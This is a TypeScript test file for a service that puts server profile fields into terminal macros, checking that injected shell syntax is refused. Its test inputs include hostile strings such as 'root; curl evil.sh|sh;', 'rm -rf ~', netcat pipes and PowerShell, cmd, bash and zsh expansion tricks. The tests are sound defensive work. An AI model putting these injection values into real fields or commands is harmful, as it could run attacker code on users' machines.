import { describe, expect, it } from "vitest";
import {
  hasProfileTokens,
  profileTokenLabel,
  profileTokensUsed,
  resolveProfileTokens,
  unescapeProfileTokens,
  PROFILE_TOKEN_WHITELIST
} from "../../src/services/profileTokens";
import type { ProfileTokenContext } from "../../src/services/profileTokens";
import { scanPlaceholders, substituteMacroVariables } from "../../src/services/macroVariables";
import type { ServerConfig } from "../../src/models/config";

function server(overrides: Partial<ServerConfig> = {}): ServerConfig {
  return {
    id: "srv-1",
    name: "Core Switch",
    host: "10.1.2.3",
    port: 22,
    username: "admin",
    authType: "password",
    isHidden: false,
    ...overrides
  };
}

/** Every outcome the tests assert on is a success — narrows without `as`. */
function resolved(text: string, cfg: ServerConfig, context?: ProfileTokenContext): string {
  const outcome = resolveProfileTokens(text, cfg, context);
  if (!outcome.ok) {
    throw new Error(`expected a resolution, got ${outcome.error.kind} for ${outcome.error.token}`);
  }
  return outcome.text;
}

describe("resolveProfileTokens — substitution", () => {
  it("substitutes every whitelisted token", () => {
    const cfg = server({ ipmiHost: "bmc.example.com", port: 2222 });
    expect(
      resolved("${profile.name} ${profile.host}:${profile.port} ${profile.username} ${profile.ipmiHost}", cfg)
    ).toBe("Core Switch 10.1.2.3:2222 admin bmc.example.com");
  });

  it("leaves text with no tokens untouched", () => {
    expect(resolved("show version\n", server())).toBe("show version\n");
  });

  it("refuses a value that would be a replacement pattern, in every token", () => {
    // Two hazards, one rule. `String.replace(re, value)` expands `$&` / `$'`
    // inside the VALUE (array-append already cannot), and `runMacroOnServer`
    // hands the resolved text to the VARIABLE engine, which scans it again — so
    // a substituted `$password` would splice a prompted secret into the command.
    // Both are closed by refusing `$` and a backtick in every token, which is
    // the invariant the second pass depends on.
    for (const token of PROFILE_TOKEN_WHITELIST) {
      if (token === "port") continue;
      for (const bad of ["$& $` $'", "$password", "a$1b", "x`id`y"]) {
        const outcome = resolveProfileTokens(
          `echo \${profile.${token}}`,
          server({ [token]: bad } as Partial<ServerConfig>)
        );
        expect(outcome.ok, `expected refusal for ${token} = ${bad}`).toBe(false);
      }
    }
  });

  it("leaves a prompted variable in the macro text for the second pass, and nowhere else", () => {
    // The pipeline: profile tokens first, then the variable engine over the
    // SAME string. `$password` written by the macro author must survive this
    // pass untouched — it is a placeholder, not a profile value.
    const cfg = server({ ipmiHost: "10.0.0.9" });
    expect(resolved("ipmitool -H \${profile.ipmiHost} -P $password", cfg)).toBe(
      "ipmitool -H 10.0.0.9 -P $password"
    );
  });

  it("substitutes every occurrence of the same token", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("ping ${profile.ipmiHost}; ssh ${profile.ipmiHost}", cfg)).toBe("ping 10.9.9.9; ssh 10.9.9.9");
  });
});

describe("resolveProfileTokens — escaping", () => {
  it("$${profile.host} produces the literal token, not the value", () => {
    expect(resolved("echo $${profile.host}", server())).toBe("echo ${profile.host}");
  });

  it("an escaped token does not require the field to be set", () => {
    // The docs-style macro `echo $${profile.ipmiHost}` must stay runnable on a
    // server with no BMC — only UNESCAPED uses constrain the run.
    expect(resolved("echo $${profile.ipmiHost}", server())).toBe("echo ${profile.ipmiHost}");
  });

  it("escaped and unescaped uses of the same token coexist", () => {
    const cfg = server({ ipmiHost: "10.9.9.9" });
    expect(resolved("$${profile.ipmiHost} = ${profile.ipmiHost}", cfg)).toBe("${profile.ipmiHost} = 10.9.9.9");
  });
});

describe("resolveProfileTokens — unknown tokens", () => {
  it("passes an unknown token through verbatim and reports it", () => {
    const outcome = resolveProfileTokens("ssh ${profile.keyPath} ${profile.host}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.text).toBe("ssh ${profile.keyPath} 10.1.2.3");
    expect(outcome.unknownTokens).toEqual(["keyPath"]);
  });

  it("reports each unknown token once, in first-appearance order", () => {
    const outcome = resolveProfileTokens("${profile.b} ${profile.a} ${profile.b}", server());
    expect(outcome.ok).toBe(true);
    if (!outcome.ok) return;
    expect(outcome.unknownTokens).toEqual(["b", "a"]);
  });

  it("never exposes a non-whitelisted ServerConfig field", () => {
    const cfg = server({ keyPath: "/home/user/.ssh/id_ed25519", authProfileId: "profile-7" });
    expect(resolved("${profile.keyPath} ${profile.authProfileId} ${profile.id}", cfg)).toBe(
      "${profile.keyPath} ${profile.authProfileId} ${profile.id}"
    );
  });
});

describe("resolveProfileTokens — missing fields", () => {
  it("sends the user to the Advanced section for the field that lives there", () => {
    // "Edit Server" opens a form whose IPMI / BMC Host is collapsed, so an error
    // that only names the field is a dead end.
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain("Add it under Advanced options in the server form.");
  });

  it("refuses the run when ipmiHost is not set, naming server and field", () => {
    const outcome = resolveProfileTokens(" ipmitool -H ${profile.ipmiHost} sol activate\n", server());
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("missing");
    expect(outcome.error.token).toBe("ipmiHost");
    expect(outcome.error.serverName).toBe("Core Switch");
    expect(outcome.error.message).toContain("Core Switch");
    expect(outcome.error.message).toContain(profileTokenLabel("ipmiHost"));
    // The two implementations this rules out, both of which would "work":
    // sending the literal token, and sending an empty `-H` argument.
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H ${profile.ipmiHost}");
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -H  sol");
  });

  it("treats an empty or whitespace-only field as not set", () => {
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "" })).ok).toBe(false);
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "   " })).ok).toBe(false);
  });

  it("trims a padded value rather than substituting the padding", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "  10.0.0.1  " }))).toBe("-H 10.0.0.1");
  });

  it("treats a non-numeric port as not set instead of substituting \"undefined\"", () => {
    const outcome = resolveProfileTokens("-p ${profile.port}", server({ port: undefined as unknown as number }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("port");
  });
});

describe("resolveProfileTokens — injection defense", () => {
  it("refuses a host carrying shell syntax", () => {
    // Reachable through inventory sync and backup import, and the resolved text
    // of a localTerminal macro is executed on the user's own machine.
    const outcome = resolveProfileTokens("ping ${profile.host}", server({ host: "1.2.3.4; rm -rf ~" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("host");
    // The refusal names the offending value (that is the point of the message),
    // but it must never produce the RESOLVED command line.
    expect(JSON.stringify(outcome)).not.toContain("ping 1.2.3.4");
    expect(outcome.error.message).toContain("1.2.3.4; rm -rf ~");
  });

  it("refuses command substitution and pipes in an ipmiHost", () => {
    for (const bad of ["`curl evil|sh`", "$(id)", "10.0.0.1 && reboot", "10.0.0.1|nc x 1", "a>b"]) {
      const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad }));
      expect(outcome.ok, `expected refusal for ${bad}`).toBe(false);
    }
  });

  it("accepts ordinary addresses: IPv4, bracketed IPv6, and FQDNs", () => {
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[::1]" }))).toBe("-H [::1]");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]" }))).toBe("-H [fe80::1]");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[::ffff:10.0.0.1]" }))).toBe("-H [::ffff:10.0.0.1]");
    // The port suffix is legitimate for THIS field: `ipmiHost` reaches a URL
    // through the shipped `https://${profile.ipmiHost}/` browser macro, and the
    // unbracketed equivalent (`bmc.example.com:8443`) has always been accepted
    // by the same charset — refusing only the bracketed form would be arbitrary.
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]:623" }))).toBe("-H [fe80::1]:623");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc.example.com:8443" }))).toBe(
      "-H bmc.example.com:8443"
    );
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "fe80::1" }))).toBe("-H fe80::1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc-01.dc1.example.com" }))).toBe("-H bmc-01.dc1.example.com");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "10.0.0.1" }))).toBe("-H 10.0.0.1");
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "bmc_01" }))).toBe("-H bmc_01");
  });

  it("requires port to be digits only", () => {
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22; id" as unknown as number })).ok).toBe(false);
    expect(resolved("-p ${profile.port}", server({ port: 2222 }))).toBe("-p 2222");
  });

  it("refuses a newline in ANY token — a terminal send executes what follows it", () => {
    for (const token of PROFILE_TOKEN_WHITELIST) {
      if (token === "port") continue;
      const outcome = resolveProfileTokens(`x \${profile.${token}}`, server({ [token]: "ok\nreboot" } as Partial<ServerConfig>));
      expect(outcome.ok, `expected refusal for ${token}`).toBe(false);
    }
  });

  it("still allows a free-form display name — it is a label, not an address", () => {
    expect(resolved("# ${profile.name}", server({ name: "Core Switch DC1" }))).toBe("# Core Switch DC1");
    // Spaces, accents, slashes and dots stay legal. `name` is now a POSITIVE
    // charset (Unicode letters/marks/digits, a space, and `. - _ / : , +`), so
    // these are legal because they are ON the list, not because nobody thought
    // to forbid them — see the `NAME_CHARSET` comment for why the blacklist that
    // used to live here was abandoned.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Ünit 2" }))).toBe("# Rack 4 / Ünit 2");
    expect(resolved("# ${profile.name}", server({ name: "Rack A - Spare" }))).toBe("# Rack A - Spare");
    expect(resolved("# ${profile.name}", server({ name: "Ærø-Süd Ünit 2" }))).toBe("# Ærø-Süd Ünit 2");
    expect(resolved("# ${profile.name}", server({ name: "Rack 4, Unit 2" }))).toBe("# Rack 4, Unit 2");
    // A decomposed accent is a combining MARK, not a letter — `\p{M}` is in the
    // class so "Ünit" typed as U + U+0308 is not refused for being spelled
    // differently from the identical-looking precomposed form.
    const decomposed = "U\u0308nit 2";
    expect(resolved("# ${profile.name}", server({ name: decomposed }))).toBe(`# ${decomposed}`);
  });

  it("refuses parentheses in a display name, which USED TO BE ACCEPTED as \"Core Switch (DC1)\"", () => {
    // DELIBERATE FLIP of the old "parentheses are fine" assertion. The local
    // shell a `localTerminal` macro lands in is the platform default, which on
    // Windows is PowerShell, and PowerShell evaluates a parenthesised
    // subexpression in ARGUMENT position: the resolved line below started calc
    // before Write-Output was handed anything. A server name reaches the config
    // from a backup import and from inventory sync, so this is attacker-supplied
    // input that needed no character the old blacklist refused.
    const outcome = resolveProfileTokens("Write-Output ${profile.name}\n", server({ name: "(Start-Process calc)" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact executable line the pre-fix implementation produced.
    expect(JSON.stringify(outcome)).not.toContain("Write-Output (Start-Process calc)");
    // And the message names what the field ACCEPTS, or it is a dead end. It no
    // longer enumerates what to remove: under a positive charset that list is
    // "everything else", so the guidance is phrased the only way it still can be.
    expect(outcome.error.message).toContain("Use letters, digits, spaces");
    // The ordinary label, minus the parens, still runs.
    expect(resolved("Write-Output ${profile.name}\n", server({ name: "Core Switch DC1" }))).toBe(
      "Write-Output Core Switch DC1\n"
    );
  });

  it("refuses braces in a display name — `.{…}` invokes a scriptblock out of characters otherwise legal", () => {
    // `&` is already refused, but `.` cannot be (every site-code label has dots),
    // so a scriptblock literal is one permitted character away from running.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: ".{Start-Process calc}" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain(".{Start-Process calc}\\n");
    expect(outcome.error.message).toContain("Use letters, digits, spaces");
  });

  it("refuses `%` in a display name — cmd.exe expands `%VAR%` at command position", () => {
    // DELIBERATE FLIP of "% is just a character". The third default shell:
    // `terminal.integrated.defaultProfile.windows` can be Command Prompt, and
    // cmd expands `%COMSPEC%` while PARSING, before anything runs — so the
    // resolved line below launches calc via cmd.exe, using no character the old
    // blacklist refused. A name arrives from inventory sync and backup import.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: "%COMSPEC% /c calc" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact executable line the pre-fix implementation produced.
    expect(JSON.stringify(outcome)).not.toContain("%COMSPEC% /c calc\\n");
    // The message names the allowed set, or it is a dead end.
    expect(outcome.error.message).toContain("Use letters, digits, spaces");
    // An ordinary label is unaffected — this is not a new charset for `name`.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Ünit 2" }))).toBe("# Rack 4 / Ünit 2");
  });

  it("refuses `!` — interactive bash expands `!!` into a previous command line, punctuation included", () => {
    // Delayed expansion is off by default in cmd, so cmd is not the reason;
    // bash is. History expansion is on in every interactive shell, and a macro
    // send lands in one.
    const outcome = resolveProfileTokens("echo ${profile.name}\n", server({ name: "DC1!!" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("echo DC1!!");
    expect(outcome.error.message).toContain("Use letters, digits, spaces");
  });

  it("refuses `^` — bash QUICK SUBSTITUTION rewrites and runs the previous command line", () => {
    // DELIBERATE FLIP of the assertion that used to stand here ("keeps `^`
    // legal"). That decision reasoned only about cmd.exe, where `^` is an escape
    // character and escaping can only REMOVE meaning, and then called `^`
    // "an ordinary character" in bash. It is not. At the START OF A LINE bash
    // performs quick substitution: `^old^new^` is shorthand for `!!:s/old/new/`,
    // which rewrites the PREVIOUS history entry and executes the result.
    // Confirmed against interactive bash 5.2.
    const name = "^echo SAFE MODE^printf PWNED^";
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact line the pre-fix implementation produced — a quick substitution
    // sitting at line start, which bash expands against history before running.
    // The message quotes the offending VALUE (that is its job), so what must be
    // absent is the value followed by the macro's own newline: the executable
    // line, not the diagnostic.
    expect(JSON.stringify(outcome)).not.toContain("PWNED^\\n");

    // The character alone, anywhere in the value: a whitelist does not condition
    // on position, and it is the FOURTH single-character hole this blacklist
    // sprang, which is why `name` is now a positive charset instead.
    for (const bad of ["^", "Rack 4 ^ Spare", "DC1^", "^^"]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("refuses the characters the ZSH lens adds — `=` at word start is `=command` expansion", () => {
    // The shell the old blacklist never considered, and macOS's default: zsh's
    // EQUALS option is on by default, so `=ls` at word start expands to the
    // `$PATH` lookup `/bin/ls`. One character, one substituted path — the same
    // class as cmd's `%VAR%`, and a positive charset refuses it by simply not
    // listing it.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: "=cmd" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("=cmd\\n");
    for (const bad of ["=", "=cmd", "DC1=A", "rack=4"]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    // `@` goes for the PowerShell reason: `@name` in argument position SPLATS a
    // session variable's contents into the command's arguments. It stays legal
    // in `username`, where `user@REALM` is a real account form and the value
    // cannot contain a space, and that difference is deliberate.
    for (const bad of ["@", "@args", "rack@dc1"]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    expect(resolved("-U ${profile.username}", server({ username: "user@REALM.EXAMPLE.COM" }))).toBe(
      "-U user@REALM.EXAMPLE.COM"
    );
  });

  it("refuses anything simply NOT on the list — the property a blacklist could not have", () => {
    // The whole point of the flip. None of these was ever enumerated by the old
    // blacklist, and every one of them is refused now for the same reason: it is
    // not a letter, a mark, a digit, a space, or one of `. - _ / : , +`.
    for (const bad of ["Rack 20\u00B0C", "Cost \u20AC5", "8\u00D712", "a\u00A0b", "\u2013dash", "rack\uFF1Fone"]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("refuses `#` in a display name — a comment character DELETES the rest of the author's command", () => {
    // NOT execution and NOT expansion, which is why it took a second look: `#`
    // starts a comment in every interactive bash and in PowerShell, so what it
    // does is TRUNCATE. The macro's own `--required-check` is what disappears,
    // and nothing reports it. A name arrives from inventory sync and backup
    // import, so the value picking which flag to drop is externally supplied.
    const name = "device #";
    const macro = "tool ${profile.name} --required-check\n";
    const outcome = resolveProfileTokens(macro, server({ name }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    expect(outcome.error.message).toContain("Use letters, digits, spaces");

    // THE SHAPE OF THE BUG, spelled out: this is the exact line the pre-fix
    // implementation substituted — a safety flag sitting AFTER a comment
    // character, i.e. text the shell throws away. Asserting the refusal alone
    // would pass against a `name` rule that happened to reject "device #" for
    // some unrelated reason, so pin the string that must never be produced.
    const preFix = macro.replace("${profile.name}", name);
    expect(preFix).toBe("tool device # --required-check\n");
    // …and everything from the `#` onwards is what a default shell discards.
    expect(preFix.slice(preFix.indexOf("#"))).toBe("# --required-check\n");
    expect(JSON.stringify(outcome)).not.toContain("tool device # --required-check");

    // The same character alone, wherever it sits in the value.
    for (const bad of ["#", "#4", "Device #4", "a#b", "DC1 #spare"]) {
      expect(resolveProfileTokens(macro, server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("keeps hyphenated, dotted, slashed and colon-bearing labels legal — `#` did not narrow the rest", () => {
    // The pinned allowed set, one label per punctuation mark the charset keeps.
    // `Rack 4 ^ Spare` USED TO BE IN THIS LIST and has moved to the refusal test
    // above — that is the deliberate flip. `:` stays: it is inert in an argument
    // for bash, zsh and PowerShell, and cmd's `::` comment is a LABEL, only
    // recognised as the first token of a command, so it is not reachable from a
    // single character mid-line.
    for (const good of ["Rack A - Spare", "dc1.rack4.unit2", "Rack 4 / Ünit 2", "DC1: Core Switch", "Rack 4, Unit 2"]) {
      expect(resolved("tool ${profile.name} --required-check\n", server({ name: good }))).toBe(
        `tool ${good} --required-check\n`
      );
    }
  });

  it("refuses `%`, `!` and `#` one at a time, in `name` only — the address charsets already excluded them", () => {
    for (const bad of ["a%b", "100%", "a!b", "Do not touch!", "a#b", "#1"]) {
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    // `host`/`ipmiHost`/`username` are positive charsets and never admitted
    // any of the three — asserted so the two rules cannot silently diverge.
    for (const bad of ["10.0.0.1%2", "10.0.0.1!", "10.0.0.1#"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(false);
    }
    for (const bad of ["ad%min", "admin!", "admin#1"]) {
      expect(resolveProfileTokens("-U ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(false);
    }
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22%" as unknown as number })).ok).toBe(false);
    expect(resolveProfileTokens("-p ${profile.port}", server({ port: "22#" as unknown as number })).ok).toBe(false);
  });

  it("refuses parens and braces one at a time, and only in `name` — the address charsets are untouched", () => {
    for (const bad of ["a(b", "a)b", "a{b", "a}b", "(id)", "Core Switch (DC1)"]) {
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
    // `host`/`ipmiHost` never accepted these anyway (they are charsets, not
    // blacklists) and MUST keep accepting bracketed IPv6.
    expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "(id)" })).ok).toBe(false);
    expect(resolved("-H ${profile.ipmiHost}", server({ ipmiHost: "[fe80::1]" }))).toBe("-H [fe80::1]");
  });

  it("refuses glob syntax in a display name, which USED TO ACCEPT `[abc]` and `*`", () => {
    // DELIBERATE FLIP of the old "square brackets are fine" assertion. The old
    // rationale only asked whether `[Type]::Member` could reach a PowerShell
    // METHOD (it cannot without `(` or `{`, both refused). It never asked what a
    // default bash does with the same characters: pathname expansion replaces
    // the word with matching FILENAMES before the command runs.
    const outcome = resolveProfileTokens("${profile.name}\n", server({ name: "./scripts/*" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("name");
    // The exact line the pre-fix implementation produced — a glob at command
    // position, which the shell resolves to a file it then executes.
    expect(JSON.stringify(outcome)).not.toContain("./scripts/*\\n");
    expect(outcome.error.message).toContain("Use letters, digits, spaces");

    // Each glob metacharacter alone, including the bracket expression that the
    // previous version of this file explicitly permitted as "Rack A [Spare]".
    for (const bad of ["x?", "[abc]", "Rack A [Spare]", "*", "a*b", "log[0-9]", "]", "["]) {
      expect(resolveProfileTokens("cmd ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("refuses `~` in a display name — one character, one home-directory path, in a default shell", () => {
    const outcome = resolveProfileTokens("ls ${profile.name}\n", server({ name: "~backup" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("ls ~backup\\n");
    expect(outcome.error.message).toContain("Use letters, digits, spaces");
    for (const bad of ["~", "DC1 ~", "~/dc1"]) {
      expect(resolveProfileTokens("ls ${profile.name}\n", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("keeps a path-shaped name legal once globs are gone — literal text is not expansion", () => {
    // The line the charset is NOT trying to draw: `/`, `.` and spaces cannot
    // expand into anything, so they stay legal even though a name of `/bin/sh`
    // at command position would run. That is the macro's template putting a
    // display name where a command goes, not this charset turning data into
    // syntax — and refusing `/` or `.` would break every site-code label.
    expect(resolved("# ${profile.name}", server({ name: "Rack 4 / Unit 2" }))).toBe("# Rack 4 / Unit 2");
    expect(resolved("# ${profile.name}", server({ name: "dc1.rack4.unit2" }))).toBe("# dc1.rack4.unit2");
  });

  it("refuses brackets in host/ipmiHost unless the WHOLE value is a bracketed IPv6 literal", () => {
    // DELIBERATE FLIP: `[` and `]` used to be plain members of the address
    // charset, accepted anywhere in the value. `[abc]` is then a POSIX bracket
    // expression — unquoted in a localTerminal macro the shell replaces it with
    // a file named `a`, `b` or `c` from the working directory, which at command
    // position is what runs.
    const outcome = resolveProfileTokens("${profile.ipmiHost}\n", server({ ipmiHost: "[abc]" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("ipmiHost");
    expect(JSON.stringify(outcome)).not.toContain("[abc]\\n");

    for (const bad of ["a[b]c", "[abc]", "10.0.0.[1-9]", "[]", "[fe80::1", "fe80::1]", "[[::1]]", "[::1]:99999999"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(
        false
      );
    }
    // The bracketed form the field exists to carry is untouched.
    expect(resolved("-H ${profile.host}", server({ host: "[::1]" }))).toBe("-H [::1]");
    expect(resolved("-H ${profile.host}", server({ host: "[fe80::1]:623" }))).toBe("-H [fe80::1]:623");
    // …and so are the unbracketed addresses, which never went near this rule.
    expect(resolved("-H ${profile.host}", server({ host: "10.0.0.1" }))).toBe("-H 10.0.0.1");
    expect(resolved("-H ${profile.host}", server({ host: "bmc.example.com" }))).toBe("-H bmc.example.com");
  });

  it("pins that the address charset admits no glob or tilde character, bracket rule aside", () => {
    // Assertion-style: `*`, `?` and `~` were never IN the positive charset, and
    // this test exists so a later "let hostnames be more permissive" edit has to
    // delete it on purpose rather than widen the class by accident.
    for (const bad of ["10.0.0.*", "host?", "~/host", "a~b", "10.0.0.1 *", "*"]) {
      expect(resolveProfileTokens("-H ${profile.host}", server({ host: bad })).ok, `host ${bad}`).toBe(false);
      expect(resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: bad })).ok, `ipmiHost ${bad}`).toBe(
        false
      );
    }
  });

  it("refuses a username carrying shell syntax — it reaches a local command line too", () => {
    // The reachable path: inventory sync writes `after.username` straight from
    // the endpoint, and the shipped IPMI template puts it in `-U` on a LOCAL
    // terminal. Without a charset here the resolved line is executable.
    const outcome = resolveProfileTokens(
      " ipmitool -U ${profile.username} sol activate\n",
      server({ username: "root; curl evil.sh|sh;" })
    );
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("username");
    // The exact line a permissive `username` produced before this check existed.
    expect(JSON.stringify(outcome)).not.toContain("ipmitool -U root; curl evil.sh|sh; sol activate");
  });

  it("refuses shell syntax in a display name, which is otherwise free-form", () => {
    const outcome = resolveProfileTokens(
      " echo ${profile.name} >> /tmp/log\n",
      server({ name: "Core; rm -rf ~" })
    );
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.token).toBe("name");
    expect(JSON.stringify(outcome)).not.toContain("echo Core; rm -rf ~ >>");
  });

  it("refuses every metacharacter in username and name, one at a time", () => {
    for (const bad of ["a;b", "a|b", "a&b", "a<b", "a>b", "a`b`", "a$b", "a'b", 'a"b', "a\\b"]) {
      expect(resolveProfileTokens("x ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(false);
      expect(resolveProfileTokens("x ${profile.name}", server({ name: bad })).ok, `name ${bad}`).toBe(false);
    }
  });

  it("accepts the usernames people actually have, including the email-style form", () => {
    for (const good of [
      "admin",
      "svc_nexus",
      "first.last",
      "ADMIN-2",
      "user@REALM.EXAMPLE.COM",
      "svc-acct@corp.example.com"
    ]) {
      expect(resolved("-U ${profile.username}", server({ username: good }))).toBe(`-U ${good}`);
    }
    // A space is not part of any real username, and it is what separates one
    // argument from the next.
    expect(resolveProfileTokens("-U ${profile.username}", server({ username: "two words" })).ok).toBe(false);
  });

  it("refuses a LEADING `@` in a username — a whole word starting with `@` is PowerShell splatting", () => {
    // REVIEW FINDING (P2). `USERNAME_CHARSET` used to allow `@` ANYWHERE, and its
    // comment justified the exception by saying a username is a single word with
    // no space, so it "cannot become `@name` as its own argument". `@args` is a
    // single word with no space. Under PowerShell — the default profile of a
    // fresh terminal on Windows, which is where the shipped ipmitool macro runs —
    // `@args` in argument position SPLATS the session variable `$args`, expanding
    // outside data into the command's argument list. Exactly the capability `@`
    // was refused from `name` for, reached through the field that kept it.
    const macro = " ipmitool -U ${profile.username} -H 10.0.0.1 sol activate\n";
    const outcome = resolveProfileTokens(macro, server({ username: "@args" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.kind).toBe("invalid");
    expect(outcome.error.token).toBe("username");
    expect(outcome.error.message).toContain('one "@" between name and realm');

    // THE SPLATTING SHAPE, pinned: this is the line the old charset produced —
    // `@args` standing as its own word where an account name belongs. Asserting
    // only the refusal would pass against a rule that rejected the value for some
    // unrelated reason, so name the string that must never be built.
    const preFix = macro.replace("${profile.username}", "@args");
    expect(preFix).toBe(" ipmitool -U @args -H 10.0.0.1 sol activate\n");
    expect(preFix.split(" ")).toContain("@args");
    expect(JSON.stringify(outcome)).not.toContain("-U @args -H");

    // Leading, trailing and repeated — the `@` is legal only BETWEEN two nonempty
    // components. A username arrives from inventory sync, backup import and a
    // linked auth profile, so every one of these is externally supplied.
    for (const bad of ["@", "@args", "@admin", "user@", "a@b@c", "@user@realm", "admin@@realm"]) {
      expect(resolveProfileTokens("-U ${profile.username}", server({ username: bad })).ok, `username ${bad}`).toBe(
        false
      );
    }
    // …and the form the exception exists for is untouched.
    expect(resolved("-U ${profile.username}", server({ username: "user@REALM" }))).toBe("-U user@REALM");
  });

  it("names the offending value and what the field accepts, so the message is not a dead end", () => {
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: "https://10.0.0.1/" }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain('"https://10.0.0.1/"');
    expect(outcome.error.message).toContain("Use the address only");
    expect(outcome.error.message).toContain("https://");
    expect(outcome.error.message).toContain("Nothing was sent.");
  });

  it("truncates a very long offending value instead of pasting it whole into a notification", () => {
    const outcome = resolveProfileTokens("-H ${profile.ipmiHost}", server({ ipmiHost: `${"a".repeat(300)};id` }));
    expect(outcome.ok).toBe(false);
    if (outcome.ok) return;
    expect(outcome.error.message).toContain("…");
    expect(outcome.error.message.length).toBeLessThan(400);
  });
});

/**
 * REVIEW FINDING (P2) — a bare IPv6 host is legal in an address field, correct
 * on a command line (`-H fe80::1`), and NOT a URL: `https://fe80::1/` fails
 * `new URL()`, so the shipped browser macro opened nothing and blamed the macro
 * text. The value's form is what depends on the destination, so the destination
 * is passed in.
 */
describe("resolveProfileTokens — URL form brackets a bare IPv6 address", () => {
  const URL_FORM: ProfileTokenContext = { form: "url" };

  it("brackets a bare IPv6 literal so the result parses as a URL", () => {
